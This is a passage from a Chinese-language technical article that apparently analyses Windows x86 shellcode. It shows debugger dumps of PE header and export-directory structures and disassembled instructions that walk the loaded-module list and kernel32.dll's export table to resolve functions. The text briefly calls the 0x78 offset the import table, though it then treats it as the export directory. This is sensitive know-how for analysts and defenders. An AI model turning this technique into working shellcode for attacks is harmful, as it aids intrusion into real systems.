   +0x012 e_csum           : Uint2B
   +0x014 e_ip             : Uint2B
   +0x016 e_cs             : Uint2B
   +0x018 e_lfarlc         : Uint2B
   +0x01a e_ovno           : Uint2B
   +0x01c e_res            : [4] Uint2B
   +0x024 e_oemid          : Uint2B
   +0x026 e_oeminfo        : Uint2B
   +0x028 e_res2           : [10] Uint2B
   +0x03c e_lfanew         : Int4B       # [edx + 0x3c] PE HEADER RVA</code></pre>
<p>指令<code>mov eax, dword ptr [eax + 0x78]</code>从PE头找到导入表的位置，偏移<code>0x78=len(PE Signature)+len(Optional Header)=0x18+0x60</code>，而对应导出表的<code>IMAGE_EXPORT_DIRECTORY</code>结构体:</p>
<pre class="x86asm"><code> dt IMAGE_EXPORT_DIRECTORY
ole32!IMAGE_EXPORT_DIRECTORY
   +0x000 Characteristics  : Uint4B
   +0x004 TimeDateStamp    : Uint4B
   +0x008 MajorVersion     : Uint2B
   +0x00a MinorVersion     : Uint2B
   +0x00c Name             : Uint4B
   +0x010 Base             : Uint4B
   +0x014 NumberOfFunctions : Uint4B
   +0x018 NumberOfNames    : Uint4B          # Fetch
   +0x01c AddressOfFunctions : Uint4B        # Fetch
   +0x020 AddressOfNames   : Uint4B          # Fetch
   +0x024 AddressOfNameOrdinals : Uint4B     # Fetch</code></pre>
<p>下面四条指令读取了导出表结构中的导出函数个数以及函数名、序号、地址等列表的地址，其实就是取到了遍历所需的数据。</p>
<pre class="x86asm"><code>0x0042:  8B 48 18                mov    ecx, dword ptr [eax + 0x18] ;ecx=NumberOfNames  
0x0045:  8B 58 20                mov    ebx, dword ptr [eax + 0x20] ;ebx=AddressOfNamesRVA
...
0x0069:  8B 58 24                mov    ebx, dword ptr [eax + 0x24]  ;ebx=AddressOfNameOrdinalsRVA
...
0x0072:  8B 58 1C                mov    ebx, dword ptr [eax + 0x1c]  ;ebx=AddressOfFunctionsRVA</code></pre>
<p>若导出表不存在（即地址为0）或者遍历完整个导出表都无法找到函数则根据<code>InMemoryOrderModuleList</code>双链表的Flink找到下一个<code>_LDR_DATA_TABLE_ENTRY</code>结构体继续寻找。所以每次调用都会从第一个双链表的节点依次寻找，直到找到<code>kernel32.dll</code>里面的导出函数。</p>
<pre class="x86asm"><code>0x0088:  58                      pop    eax
0x0089:  5F                      pop    edi
0x008a:  5A                      pop    edx                  ;edx=InMemoryOrderModuleList
